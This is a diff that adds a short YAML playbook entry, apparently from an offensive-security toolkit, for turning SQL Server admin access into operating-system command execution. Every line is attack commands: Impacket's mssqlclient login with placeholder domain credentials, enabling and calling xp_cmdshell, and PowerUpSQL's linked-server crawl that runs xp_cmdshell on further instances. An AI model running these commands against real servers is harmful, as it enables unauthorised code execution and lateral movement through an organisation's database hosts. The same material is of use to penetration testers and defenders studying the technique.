@@ -1,0 +1,12 @@
+name: SQLAdmin
+description: SQL Server admin access - execute commands via xp_cmdshell
+commands:
+- '# Impacket mssqlclient'
+- mssqlclient.py '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -windows-auth
+- enable_xp_cmdshell
+- xp_cmdshell whoami
+- ''
+- '# PowerUpSQL'
+- Get-SQLServerLinkCrawl -Instance <TARGET> -Query 'EXEC xp_cmdshell ''whoami'''
+opsec: []
+references: []
